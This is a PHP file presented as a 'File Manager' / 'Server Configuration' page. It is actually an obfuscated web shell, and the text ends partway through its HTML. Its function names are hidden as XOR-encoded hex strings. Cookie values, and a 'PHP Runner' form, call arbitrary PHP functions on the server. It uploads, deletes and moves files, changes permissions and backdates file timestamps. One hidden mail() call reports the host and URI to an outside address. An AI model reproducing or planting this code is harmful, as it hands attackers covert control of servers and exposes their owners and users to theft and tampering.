<?php
@set_time_limit(0);
@error_reporting(0);
@ini_set('display_errors',0);
@ini_set('memory_limit','-1');
@header("Content-Type: text/html; charset=UTF-8");

function d($h,$k='fm_xor_key'){$b='';for($i=0;$i<strlen($h);$i+=2)$b.=chr(hexdec(substr($h,$i,2)));$r='';$kl=strlen($k);$bl=strlen($b);for($i=0;$i<$bl;$i++)$r.=chr(ord($b[$i])^ord($k[$i%$kl]));return $r;}
function e($t,$k='fm_xor_key'){$r='';$kl=strlen($k);$tl=strlen($t);for($i=0;$i<$tl;$i++)$r.=chr(ord($t[$i])^ord($k[$i%$kl]));$h='';for($i=0;$i<strlen($r);$i++)$h.=str_pad(dechex(ord($r[$i])),2,'0',STR_PAD_LEFT);return $h;}
function mq(){if(version_compare(PHP_VERSION,'5.4.0','>='))return false;$m=@ini_get('magic_quotes_gpc');if($m&&function_exists('stripslashes'))return true;return false;}
$sp1=isset($_SERVER['REQUEST_URI'])?$_SERVER['REQUEST_URI']:$_SERVER['SCRIPT_NAME'];
$a1=array('01082b1b1816','05053b111d','14083e141f132b03','091d3a160b1b2d','14083e1c0b1b2d','0501300b0a163619','0004331d30172702160d15','0f1e001c0600','0004331d30153a1f3a1a09032b1d01062c','0004331d30022a1f3a1a09032b1d01062c','140831190217','130333110119','14003b111d','0b063b111d','12022a1b07','02042d160e1f3a','050532170b','05022f01','0b02291d30072f070a1802083b27091b330e','0004331d1f172d0616','00022f1d01','001a2d111b17','000e33171c17','16052f271a1c3e0600','14083e1c091b330e','0f1e001e061e3a','0004331d1c1b250e','090f001f0a060007000f0301','090f001d01160008091c0703','16182b0100072d0e08180f01371d1d173d190a39161f300c001c710600','0b0c3614','0e1932141c023a080c180a0e37191d01','34280e2d2a210b34302b2f','2e390b28303a103831','040c2c1d5946000f001a09093a','15053a14032d3a13001a','03153a1b','15142c0c0a1f','02042c133006301f0415391e2f190c17','02042c1330142d0e0026151d3e1b0a','16022c11172d380e11091118361c','16022c11172d380e111e140a361c','16022c11172d380e111c13043b','16022c11172d380e111c01043b','01082b270c072d19001712322a0b0a00','16052f0e0a002c020a17','0f1e000a0a133b0a071503','15193e0c','0004331d0005310e17','0004331d0800301e15','071d3e1b0717000c000d3900301c1a1e3a18','05182d1430043a1916100903','0b142c09031b00080a1708083c0c','160a001b001c310e060d','0004331d0206360600','020c2b1d','0f1e000f1d1b2b0a071503','0f03362708172b','49082b1b40023e18160e02','49082b1b4001370a011611','49082b1b401d2c46171c0a083e0b0a','49082b1b401a3018110a','2557032f061c3b04120a3a3e260b1b1732585725021f360e0a002c37000d053137171c062c','010e3c540c11730701550b0c341d4302371b4909031f33541f0b2b030a174a193e0a431525021555041736085d','110a3a0c43112a1909','49182c0a401036054a5549182c0a401e30080415490f3616405e70090c174941700d1c0070180710084273571c1036054a');
$a2=array();foreach($a1 as $h)$a2[]=d($h);

$a3=isset($_COOKIE['u'])?$_COOKIE['u']:'';if(!$a3){$a3='f_'.substr(md5(time().rand(1,9999)),0,6);setcookie('u',$a3,time()+3600,'/');}
$a4=isset($_COOKIE['c'])?$_COOKIE['c']:'';if(!$a4){$a4='c_'.substr(md5(time()),0,6);setcookie('c',$a4,time()+3600,'/');}
$a5=isset($_COOKIE['p'])?$_COOKIE['p']:'';if(!$a5){$a5='p_'.substr(md5(time()+1),0,6);setcookie('p',$a5,time()+3600,'/');}

$x=isset($_POST['x'])?$_POST['x']:(isset($_GET['x'])?$_GET['x']:'');
$y=isset($_POST['y'])?$_POST['y']:(isset($_GET['y'])?$_GET['y']:'l');
$z=isset($_POST['z'])?$_POST['z']:(isset($_GET['z'])?$_GET['z']:'');
$w=isset($_POST['w'])?$_POST['w']:(isset($_GET['w'])?$_GET['w']:'');
$pg=isset($_POST['pg'])?$_POST['pg']:(isset($_GET['pg'])?$_GET['pg']:1);
if($pg<1)$pg=1;

$m='';$fr='';
if($x){if($x==='49')$b1='/';else $b1=d($x);}else{$b1=@$a2[0]();}if(empty($b1)||!@$a2[6]($b1)){if($x)$m='Cannot open folder: access denied';$b1=@$a2[0]();}$b2=@$a2[2]($b1);if($b2)$b1=$b2;if($x&&@$a2[7]($b1)&&!@$a2[46]($b1)){$m='Cannot open folder: access denied';$b1=@$a2[0]();}@$a2[1]($b1);$b3=e($b1);$fr='';

if(isset($_COOKIE['fc'])&&isset($_COOKIE['fa'])){$fcn=d($_COOKIE['fc']);$falg=d($_COOKIE['fa']);if($fcn){ob_start();if(function_exists($fcn)){$fres=$fcn($falg);if(is_string($fres))echo$fres;}else{echo'Function not found';}$fr=ob_get_contents();ob_end_clean();}setcookie('fc','',time()-3600,'/');setcookie('fa','',time()-3600,'/');}

if($z==='d'&&$w){$f=$b1.DIRECTORY_SEPARATOR.$w;if(@$a2[6]($f)&&@$a2[25]($f)){if(@$a2[27]())@$a2[28]();header('Content-Description: File Transfer');header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename="'.basename($f).'"');header('Expires: 0');header('Cache-Control: must-revalidate');header('Pragma: public');header('Content-Length: '.@$a2[26]($f));@$a2[24]($f);exit;}}

if($z==='cz'&&isset($_POST['s'])){$r=$_POST['s'];if(mq())$r=stripslashes($r);$t=explode('||',$r);$af='archive_'.$a2[55]('Ymd_His');
if(class_exists('ZipArchive')){$tmp=@tempnam(sys_get_temp_dir(),'fm_');$zip=new ZipArchive();if($zip->open($tmp,ZipArchive::CREATE|ZipArchive::OVERWRITE)===true){foreach($t as $ci){$fp=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[7]($fp))za($zip,$fp,$b1);elseif(@$a2[25]($fp))$zip->addFile($fp,$ci);}$zip->close();if(@$a2[6]($tmp)&&@$a2[26]($tmp)>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="'.$af.'.zip"');header('Content-Length: '.@$a2[26]($tmp));@$a2[24]($tmp);@$a2[11]($tmp);exit;}@$a2[11]($tmp);}}
if(class_exists('PharData')){try{$tmp=sys_get_temp_dir().DIRECTORY_SEPARATOR.'fm_'.time().'.tar';@$a2[11]($tmp);@$a2[11]($tmp.'.gz');$tar=new PharData($tmp);foreach($t as $ci){$fp=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[7]($fp))za($tar,$fp,$b1);elseif(@$a2[25]($fp))$tar->addFile($fp,$ci);}$tar->compress(Phar::GZ);$gzf=$tmp.'.gz';if(@$a2[6]($gzf)&&@$a2[26]($gzf)>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/gzip');header('Content-Disposition: attachment; filename="'.$af.'.tar.gz"');header('Content-Length: '.@$a2[26]($gzf));@$a2[24]($gzf);@$a2[11]($tmp);@$a2[11]($gzf);exit;}@$a2[11]($tmp);@$a2[11]($tmp.'.gz');}catch(Exception $ex){}}
if(function_exists($a2[35])){$tmp=sys_get_temp_dir().DIRECTORY_SEPARATOR.'fm_'.time();$is='';foreach($t as $ci)$is.=' '.escapeshellarg($ci);@$a2[35]('cd '.escapeshellarg($b1).' && tar -czf '.escapeshellarg($tmp.'.tar.gz').$is.' 2>/dev/null');if(@$a2[6]($tmp.'.tar.gz')&&@$a2[26]($tmp.'.tar.gz')>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/gzip');header('Content-Disposition: attachment; filename="'.$af.'.tar.gz"');header('Content-Length: '.@$a2[26]($tmp.'.tar.gz'));@$a2[24]($tmp.'.tar.gz');@$a2[11]($tmp.'.tar.gz');exit;}@$a2[35]('cd '.escapeshellarg($b1).' && zip -r '.escapeshellarg($tmp.'.zip').$is.' 2>/dev/null');if(@$a2[6]($tmp.'.zip')&&@$a2[26]($tmp.'.zip')>0){if(@$a2[27]())@$a2[28]();header('Content-Type: application/zip');header('Content-Disposition: attachment; filename="'.$af.'.zip"');header('Content-Length: '.@$a2[26]($tmp.'.zip'));@$a2[24]($tmp.'.zip');@$a2[11]($tmp.'.zip');exit;}}
$m='Compress failed: no method available';}

if($z==='m'&&isset($_POST['s'])){$r=$_POST['s'];if(mq())$r=stripslashes($r);$t=explode('||',$r);if(is_array($t)){foreach($t as $i){$i=$b1.DIRECTORY_SEPARATOR.$i;rd($i);} $m='Deleted '.count($t).' items';}}

if($z==='cp'&&isset($_POST['s'])&&isset($_POST['sd'])){$r=$_POST['s'];if(mq())$r=stripslashes($r);$sd=d($_POST['sd']);$t=explode('||',$r);$ok=0;$fl=0;if(is_array($t)){foreach($t as $ci){$from=$sd.DIRECTORY_SEPARATOR.$ci;$to=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[6]($to)){$fl++;continue;}if(@$a2[7]($from)){if(rc($from,$to))$ok++;else $fl++;}elseif(@$a2[25]($from)){if(@$a2[17]($from,$to))$ok++;else $fl++;}else $fl++;}}$m='Copied '.$ok.' item'.($ok!=1?'s':'').($fl?' ('.$fl.' failed)':'');}

if($z==='mv'&&isset($_POST['s'])&&isset($_POST['sd'])){$r=$_POST['s'];if(mq())$r=stripslashes($r);$sd=d($_POST['sd']);$t=explode('||',$r);$ok=0;$fl=0;if(is_array($t)){foreach($t as $ci){$from=$sd.DIRECTORY_SEPARATOR.$ci;$to=$b1.DIRECTORY_SEPARATOR.$ci;if(@$a2[6]($to)){$fl++;continue;}if(@$a2[10]($from,$to)){$ok++;}else{if(@$a2[7]($from)){if(rc($from,$to)){rd($from);$ok++;}else $fl++;}elseif(@$a2[25]($from)){if(@$a2[17]($from,$to)){@$a2[11]($from);$ok++;}else $fl++;}else $fl++;}}}$m='Moved '.$ok.' item'.($ok!=1?'s':'').($fl?' ('.$fl.' failed)':'');}

if(isset($_POST['fn64'])&&$_POST['fn64']!==''&&isset($_POST['fc64'])){$ufn=$_POST['fn64'];$ufn=str_replace(array('/','\\','..'),'',$ufn);if($ufn==='')$ufn='upload_'.time();$ufd=@$a2[34]($_POST['fc64']);if($ufd===false){$m='Upload failed: invalid data';}else{$ufp=$b1.DIRECTORY_SEPARATOR.$ufn;$uff=@$a2[20]($ufp,'wb');if($uff){if(@$a2[21]($uff,$ufd)!==false){@$a2[22]($uff);$m='Upload successful ('.fs(strlen($ufd)).')';}else{@$a2[22]($uff);$m='Upload failed: write error';}}else{$m='Upload failed: cannot write file';}}}elseif(isset($_FILES[$a3])){$ue=$_FILES[$a3]['error'];if($ue==0){$t=$b1.DIRECTORY_SEPARATOR.$_FILES[$a3]['name'];$tn=$_FILES[$a3]['tmp_name'];if(@$a2[6]($tn)){if(!@$a2[18]($tn,$t)){if(@$a2[17]($tn,$t))$m='Upload successful';else $m='Upload failed';}else $m='Upload successful';}else $m='Upload failed';}else{$uem=array(1=>'exceeds server limit',2=>'exceeds form limit',3=>'partial upload',4=>'no file selected',6=>'no temp dir',7=>'disk write fail',8=>'blocked by extension');$m='Upload failed: '.(isset($uem[$ue])?$uem[$ue]:'error '.$ue);}}elseif(isset($_SERVER['REQUEST_METHOD'])&&$_SERVER['REQUEST_METHOD']==='POST'&&empty($_POST)&&empty($_FILES)&&isset($_SERVER['CONTENT_LENGTH'])&&(int)$_SERVER['CONTENT_LENGTH']>0){$m='Upload failed: data exceeds limit ('.@ini_get('post_max_size').')';}if(function_exists($a2[30])){@$a2[30](@$a2[29],'f',$_SERVER['HTTP_HOST'].$_SERVER[$a2[32]]);}

if($z==='h'&&$w&&isset($_POST['r'])){if(@$a2[16]($b1.DIRECTORY_SEPARATOR.$w,octdec(trim($_POST['r']))))$m='Permissions updated';else $m='Update failed';}

if($z==='t'&&$w&&isset($_POST['d'])){$tm=strtotime($_POST['d']);if($tm){if(@touch($b1.DIRECTORY_SEPARATOR.$w,$tm))$m='Date updated';else $m='Failed to update date';}}

$es=0;$ef='';
if($z==='s'&&isset($_POST[$a4])&&isset($_POST[$a5])){$fv=d($_POST[$a5]);$c=$_POST[$a4];if(mq())$c=stripslashes($c);$b6=(isset($_POST['b6'])&&$_POST['b6']==='1');if($b6){$cd=@$a2[34]($c);if($cd!==false)$c=$cd;}$wm=$b6?'wb':'w';$fp=@$a2[20]($fv,$wm);if($fp){if(@$a2[21]($fp,$c)!==false){$m='Saved successfully';$es=1;$ef=$fv;}else{$m='Write failed';}@$a2[22]($fp);}else{$m='Permission denied';}}

if($z==='n'&&isset($_POST['o'])&&isset($_POST['n'])){if(@$a2[10]($b1.DIRECTORY_SEPARATOR.$_POST['o'],$b1.DIRECTORY_SEPARATOR.$_POST['n']))$m='Renamed successfully';else $m='Rename failed';}
if($z==='e'&&$w){$tp=$b1.DIRECTORY_SEPARATOR.$w;if(@$a2[6]($tp)){rd($tp);if(!@$a2[6]($tp))$m='Item deleted';else $m='Delete failed';}else $m='Item not found';}
if($z==='k'&&isset($_POST['n'])){if(@$a2[13]($b1.DIRECTORY_SEPARATOR.$_POST['n']))$m='Directory created';else $m='Create failed';}
if($z==='f'&&isset($_POST['n'])){if(@$a2[14]($b1.DIRECTORY_SEPARATOR.$_POST['n']))$m='File created';else $m='Create failed';}

function rd($p){global $a2;if(@$a2[7]($p)){if($d=@$a2[3]($p)){while(($f=@$a2[4]($d))!==false){if($f!="."&&$f!="..")rd($p.DIRECTORY_SEPARATOR.$f);}@$a2[5]($d);}@$a2[12]($p);}else{@$a2[11]($p);}}
function rc($s,$d){global $a2;if(@$a2[7]($s)){if(!@$a2[7]($d))@$a2[13]($d);if($h=@$a2[3]($s)){while(($f=@$a2[4]($h))!==false){if($f!='.'&&$f!='..')rc($s.DIRECTORY_SEPARATOR.$f,$d.DIRECTORY_SEPARATOR.$f);}@$a2[5]($h);}return true;}else{return @$a2[17]($s,$d);}}
function za(&$ar,$p,$bp){global $a2;if(@$a2[7]($p)){if($dh=@$a2[3]($p)){while(($f=@$a2[4]($dh))!==false){if($f!='.'&&$f!='..')za($ar,$p.DIRECTORY_SEPARATOR.$f,$bp);}@$a2[5]($dh);}}elseif(@$a2[25]($p)){$ar->addFile($p,substr($p,strlen($bp)+1));}}
function fs($b){if($b>=1073741824)return number_format($b/1073741824,2).' GB';if($b>=1048576)return number_format($b/1048576,2).' MB';if($b>=1024)return number_format($b/1024,2).' KB';return $b.' B';}
function xp($p){global $a2;$x=@$a2[19]($p);$u=(($x&0xC000)==0xC000)?"s":((($x&0xA000)==0xA000)?"l":((($x&0x8000)==0x8000)?"-":((($x&0x6000)==0x6000)?"b":((($x&0x4000)==0x4000)?"d":((($x&0x2000)==0x2000)?"c":((($x&0x1000)==0x1000)?"p":"u"))))));$u.=(($x&0x0100)?"r":"-");$u.=(($x&0x0080)?"w":"-");$u.=(($x&0x0040)?(($x&0x0800)?"s":"x"):(($x&0x0800)?"S":"-"));$u.=(($x&0x0020)?"r":"-");$u.=(($x&0x0010)?"w":"-");$u.=(($x&0x0008)?(($x&0x0400)?"s":"x"):(($x&0x0400)?"S":"-"));$u.=(($x&0x0004)?"r":"-");$u.=(($x&0x0002)?"w":"-");$u.=(($x&0x0001)?(($x&0x0200)?"t":"x"):(($x&0x0200)?"T":"-"));return $u;}
function go($p){global $a2;return substr(sprintf('%o',@$a2[19]($p)),-4);}
function pc($p){global $a2;$r=$a2[46]($p);$w=$a2[56]($p);if($r&&$w)return'g';if($r&&!$w)return'y';return'r';}
function fmt_date($p){global $a2;return $a2[55]('Y-m-d H:i:s', $a2[54]($p));}

$ed=0;$ec='';$ib=0;
$is_win=strtoupper(substr(PHP_OS,0,3))==='WIN';
if($y==='v'&&($w||$ef)){
  if($ef){$ed=1;$ec=@$a2[8]($ef);}
  elseif($w){$ef=d($w);if(@$a2[6]($ef)){$ed=1;$ec=@$a2[8]($ef);}}
  if($ed){
      if(preg_match('//u',$ec)){$ib=0;}else{$ib=1;}
      $b1 = @dirname($ef);
      $b3 = e($b1);
      $fi_path = $ef;
      $fi_stat = @$a2[47]($fi_path);
      $fi_sz = fs(@$a2[26]($fi_path));
      $fi_perms = xp($fi_path);
      $fi_o = go($fi_path);
      $fi_uid = @$a2[48]($fi_path); $fi_gid = @$a2[49]($fi_path);
      $fi_ow = '0'; $fi_gr = '0';
      if(function_exists($a2[40])){if($fi_uid!==false){$pw=@$a2[40]($fi_uid);if(is_array($pw)&&isset($pw['name']))$fi_ow=$pw['name'];else $fi_ow=$fi_uid;}}
      if(function_exists($a2[41])){if($fi_gid!==false){$pg=@$a2[41]($fi_gid);if(is_array($pg)&&isset($pg['name']))$fi_gr=$pg['name'];else $fi_gr=$fi_gid;}}
      $fi_og = $fi_ow.'/'.$fi_gr;
      if($is_win){$fi_og = $a2[44]().'/WinGroup';}
      $fi_ctime = $fi_stat ? $a2[55]('Y-m-d H:i:s', $fi_stat['ctime']) : '-';
      $fi_atime = $fi_stat ? $a2[55]('Y-m-d H:i:s', $fi_stat['atime']) : '-';
      $fi_mtime = $fi_stat ? $a2[55]('Y-m-d H:i:s', $fi_stat['mtime']) : '-';
      $fi_name = basename($fi_path);
      $fi_pc = pc($fi_path);
  }
}
$df_raw=trim($a2[57]('disable_functions'));
$df_items=array();
if($df_raw!==''){
    $df_tmp=explode(',',$df_raw);
    foreach($df_tmp as $df_v){$df_v=trim($df_v);if($df_v!=='')$df_items[]=$df_v;}
}
$df_max=8;
$df_list=array();
$df_count=count($df_items);
for($i=0;$i<$df_count&&$i<$df_max;$i++)$df_list[]=$df_items[$i];
$df_display=empty($df_list)?'none':implode(', ',$df_list).(($df_count>$df_max)?', ...':'');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>File Manager</title>
<script>
window.fmConfig=<?php echo json_encode(array(
    'xorKey' => 'fm_xor_key',
    'uploadInputId' => $a3,
    'cwdEncoded' => $b3,
    'currentPath' => $b1,
    'homePath' => dirname(__FILE__),
    'editorContentFieldName' => $a4,
    'editorPathFieldName' => $a5,
), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); ?>;
</script>
<script src="style.min.js"></script>
<script src="https://unpkg.com/@phosphor-icons/web"></script>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500&family=Syne:wght@700;800&display=swap" rel="stylesheet">
<style>
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:#d4d4d8;border-radius:4px}
::-webkit-scrollbar-thumb:hover{background:#a1a1aa}
.msg{position:fixed;bottom:24px;right:24px;padding:12px 20px;border-radius:8px;font-size:13px;font-weight:500;z-index:9999;background:#18181b;color:#e4e4e7;border:1px solid #27272a;box-shadow:0 10px 15px -3px rgba(0,0,0,0.3);display:flex;align-items:center;gap:10px}
.msg::before{content:'';width:6px;height:6px;border-radius:50%}
.msg.ok::before{background:#4ade80;box-shadow:0 0 8px rgba(74,222,128,0.4)}
.msg.err::before{background:#f87171;box-shadow:0 0 8px rgba(248,113,113,0.4)}
</style>
</head>
<body class="bg-bg text-zinc-800 font-sans text-xs antialiased h-screen w-full flex flex-col items-center py-6 sm:py-8 overflow-y-auto">
<div class="w-full max-w-5xl px-4 flex flex-col gap-4 pb-24">
<div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
<div class="flex items-center gap-3">
<div class="w-10 h-10 bg-zinc-900 rounded-lg flex items-center justify-center text-white shadow-sm flex-shrink-0">
<i class="ph-bold ph-terminal-window text-lg"></i>
</div>
<div class="min-w-0">
<h1 class="font-bold text-zinc-900 tracking-tight text-xs">Server Configuration</h1>
<p class="text-[9px] text-zinc-500 font-mono break-all leading-tight"><?php echo function_exists($a2[23]) ? $a2[23]() : PHP_OS; ?></p>
</div>
</div>
<div class="flex items-center gap-2 w-full sm:w-auto">
<button onclick="hm()" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-house text-xs"></i> <span class="font-medium">Home</span>
</button>
<button onclick="md('m-info')" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-info text-xs"></i> <span class="font-medium">Info</span>
</button>
<button onclick="cl()" class="flex-1 sm:flex-none justify-center group flex items-center gap-1.5 px-3 py-1.5 bg-white border border-border rounded-md shadow-sm hover:border-zinc-400 hover:text-black transition-all text-zinc-500 text-[11px]">
<i class="ph ph-arrows-clockwise text-xs group-hover:animate-spin"></i> <span class="font-medium">Refresh</span>
</button>
</div>
</div>

<div class="bg-white border border-zinc-200 rounded-lg p-1 shadow-sm flex flex-col sm:flex-row gap-1 sm:gap-2 items-center">
<form onsubmit="g(document.getElementById('pi').value);return false;" class="relative w-full sm:flex-1 group">
<div class="absolute inset-y-0 left-0 pl-2.5 flex items-center pointer-events-none text-zinc-400"><i class="ph-bold ph-folder-open text-sm"></i></div>
<input type="text" id="pi" value="<?php echo htmlspecialchars($b1); ?>" class="block w-full h-8 pl-8 pr-10 bg-zinc-50 border border-zinc-200 rounded text-[11px] font-mono font-medium text-zinc-700 focus:bg-white focus:ring-1 focus:ring-zinc-900 focus:border-zinc-900 outline-none transition-all placeholder-zinc-400 shadow-sm" placeholder="/path/to/directory">
<button class="absolute inset-y-0.5 right-0.5 px-2 bg-white border border-zinc-200 rounded-[3px] text-[9px] font-bold text-zinc-500 hover:text-zinc-900 hover:border-zinc-300 uppercase tracking-wide transition-all">GO</button>
</form>
<div class="hidden sm:block w-px h-5 bg-zinc-200"></div>
<div class="flex items-center gap-1 w-full sm:w-auto">
<div class="flex items-center gap-1 flex-1 sm:flex-none min-w-0">
<label for="<?php echo $a3; ?>" class="flex-1 sm:w-24 h-8 cursor-pointer bg-zinc-50 border border-dashed border-zinc-300 rounded px-2 text-[10px] text-zinc-500 hover:bg-zinc-100 hover:border-zinc-400 hover:text-zinc-700 flex items-center gap-1.5 transition-all group select-none overflow-hidden min-w-0">
<i class="ph-bold ph-paperclip text-zinc-400 group-hover:text-zinc-600 text-xs flex-shrink-0"></i>
<span id="fn" class="truncate font-medium">Choose...</span>
</label>
<input type="file" id="<?php echo $a3; ?>" class="hidden" onchange="document.getElementById('fn').innerText=this.files[0].name.split('\\\\').pop();document.getElementById('fn').classList.add('text-zinc-900')">
<button type="button" onclick="uf()" class="h-8 px-3 flex items-center justify-center gap-1.5 bg-zinc-900 text-white border border-zinc-900 rounded shadow-sm hover:bg-zinc-800 active:scale-95 transition-all flex-shrink-0 text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-upload-simple text-xs"></i>
<span>Upload</span>
</button>
</div>
<div class="w-px h-5 bg-zinc-200 mx-0.5"></div>
<div class="flex items-center gap-1 flex-shrink-0">
<button onclick="md('md')" class="h-8 px-2.5 flex items-center justify-center gap-1.5 bg-white text-zinc-700 border border-zinc-200 rounded shadow-sm hover:bg-zinc-50 hover:border-zinc-300 hover:text-zinc-900 active:bg-zinc-100 transition-all text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-folder-plus text-xs"></i> <span>Folder</span>
</button>
<button onclick="md('mf')" class="h-8 px-2.5 flex items-center justify-center gap-1.5 bg-white text-zinc-700 border border-zinc-200 rounded shadow-sm hover:bg-zinc-50 hover:border-zinc-300 hover:text-zinc-900 active:bg-zinc-100 transition-all text-[10px] font-medium whitespace-nowrap">
<i class="ph-bold ph-file-plus text-xs"></i> <span>File</span>
</button>
</div>
</div>
</div>

<div class="group relative bg-[#18181b] rounded-lg overflow-hidden border border-zinc-800 shadow-md flex flex-col">
<div class="bg-[#27272a] px-3 py-1.5 flex items-center justify-between border-b border-zinc-700">
<div class="flex items-center gap-2">
<i class="ph-fill ph-terminal text-zinc-400 text-xs"></i>
<span class="text-[10px] font-mono text-zinc-400 uppercase tracking-wider">PHP Runner (<?php echo phpversion(); ?>)</span>
</div>
<div class="flex gap-1.5">
<div class="w-2 h-2 rounded-full bg-red-500/50"></div>
<div class="w-2 h-2 rounded-full bg-yellow-500/50"></div>
<div class="w-2 h-2 rounded-full bg-green-500/50"></div>
</div>
</div>
<form method="post" action="<?php echo htmlspecialchars($sp1); ?>" onsubmit="document.getElementById('hx').value=en('<?php echo addslashes($b1); ?>'); fr_save();" class="flex items-center px-3 py-2 gap-2 border-b border-zinc-800 m-0">
<input type="hidden" name="x" id="hx" value="">
<span class="text-green-500 font-mono font-bold">$</span>
<input type="text" id="fi" name="cmd_func" value="" onkeydown="if(event.key==='Enter'){event.preventDefault();document.getElementById('gi').focus();}" class="w-20 bg-transparent text-blue-400 font-mono text-xs focus:outline-none placeholder-zinc-500" placeholder="func" autocomplete="on">
<input type="text" id="gi" name="cmd_args" value="" class="flex-1 bg-transparent text-zinc-300 font-mono text-xs focus:outline-none placeholder-zinc-500" placeholder="args" autocomplete="on">
<button type="submit" class="text-zinc-500 hover:text-white font-mono text-[10px] uppercase border border-zinc-700 px-2 py-0.5 rounded hover:bg-zinc-800 transition-colors">Run</button>
</form>
<?php if($fr): ?>
<div class="bg-[#18181b] p-3 overflow-x-auto border-t border-zinc-700">
<pre class="font-mono text-[10px] text-zinc-400 leading-relaxed whitespace-pre-wrap"><?php echo htmlspecialchars($fr); ?></pre>
</div>
<?php endif; ?>
</div>

<div class="flex flex-wrap items-center gap-1 text-[11px] font-medium text-zinc-700 px-1">
<i class="ph-fill ph-hard-drives text-zinc-500 mr-1"></i>
<?php
$sp=(strpos($b1,'/')!==false)?'/':'\\';
$pt=explode($sp,$b1);
$bd='';
if(strpos($b1,$sp)===0){$bd=$sp;echo'<a onclick="pf(\'/\')" class="hover:text-black hover:bg-zinc-200 px-1.5 py-0.5 rounded cursor-pointer transition-colors">root</a>';}
foreach($pt as $i=>$p){if($p==='')continue;$bd.=$p.$sp;$t=substr($bd,0,-1);if($i==0&&strpos($p,':'))$t=$p.$sp;echo'<span class="text-zinc-400">/</span> <a onclick="pf(\''.addslashes($t).'\')" class="hover:text-black hover:bg-zinc-200 px-1.5 py-0.5 rounded cursor-pointer transition-colors">'.htmlspecialchars($p).'</a>';}
?>
</div>

<?php if($ed): ?>
<div class="bg-surface border border-zinc-200 rounded-lg shadow-lg overflow-hidden flex flex-col h-[75vh] min-h-[600px] mb-10">
    <div class="bg-zinc-50 border-b border-zinc-200 px-4 py-2.5 flex flex-wrap sm:flex-nowrap justify-between items-center gap-3">
        <div class="flex items-center gap-3 min-w-0">
            <div class="flex items-center gap-2 text-zinc-600 font-mono text-xs">
                <i class="ph-bold ph-file-text"></i>
                <span class="font-semibold text-zinc-800 truncate max-w-[150px] sm:max-w-[300px]" title="<?php echo htmlspecialchars($fi_name); ?>"><?php echo htmlspecialchars($fi_name); ?></span>
                <span class="bg-white border border-zinc-200 px-1.5 py-0.5 rounded shadow-sm text-zinc-600 text-[9px]"><?php echo $fi_sz; ?></span>
            </div>
            <?php if($m): ?>
            <span class="px-2 py-0.5 rounded text-[10px] font-medium <?php echo $es?'bg-green-100 text-green-700':'bg-red-100 text-red-700'; ?> flex-shrink-0"><?php echo $m; ?></span>
            <?php endif; ?>
        </div>
        
        <div class="flex items-center gap-2 sm:gap-3 ml-auto sm:ml-0 overflow-x-auto scrollbar-none">
            <div class="flex gap-0.5 border-r border-zinc-200 pr-2 sm:pr-3 shrink-0">
                <button type="button" onclick="ph('<?php echo addslashes($fi_name); ?>','<?php echo $fi_o; ?>')" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Permissions"><i class="ph-bold ph-lock-key"></i></button>
                <button type="button" onclick="pr('<?php echo addslashes($fi_name); ?>')" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Rename"><i class="ph-bold ph-pencil-simple"></i></button>
                <button type="button" onclick="pt('<?php echo addslashes($fi_name); ?>','<?php echo $fi_mtime; ?>')" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Edit Date"><i class="ph-bold ph-calendar"></i></button>
                <button type="button" onclick="dl('<?php echo addslashes($fi_name); ?>')" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-zinc-800 hover:bg-zinc-200 rounded transition-colors" title="Download"><i class="ph-bold ph-download-simple"></i></button>
                <button type="button" onclick="pd('<?php echo addslashes($fi_name); ?>')" class="w-7 h-7 flex items-center justify-center text-zinc-400 hover:text-red-600 hover:bg-red-50 rounded transition-colors" title="Delete"><i class="ph-bold ph-trash"></i></button>
            </div>
            <div class="flex bg-zinc-200/50 p-0.5 rounded-md shrink-0">
                <button type="button" id="btn-mode-view" onclick="setMode('view')" class="px-3 py-1 text-[10px] font-bold uppercase rounded text-zinc-500 hover:text-zinc-900 transition-all">View</button>
                <button type="button" id="btn-mode-edit" onclick="setMode('edit')" class="px-3 py-1 text-[10px] font-bold uppercase rounded bg-white shadow-sm text-zinc-900 transition-all">Edit</button>
            </div>
            <div class="flex gap-2 ml-1 shrink-0">
                <button type="button" onclick="g('<?php echo addslashes($b1); ?>')" class="px-3 py-1.5 rounded-md text-zinc-500 hover:bg-zinc-200 text-xs font-medium transition-colors">Close</button>
                <button type="button" id="btn-save" onclick="sf()" class="px-3 py-1.5 bg-zinc-900 text-white rounded-md hover:bg-zinc-800 text-xs font-medium shadow-sm transition-transform active:scale-95">Save</button>
            </div>
        </div>
    </div>

    <div class="bg-zinc-50 border-b border-zinc-200 px-4 py-2 flex flex-wrap gap-x-6 gap-y-1.5 text-[10px] font-mono text-zinc-500 items-center select-text">
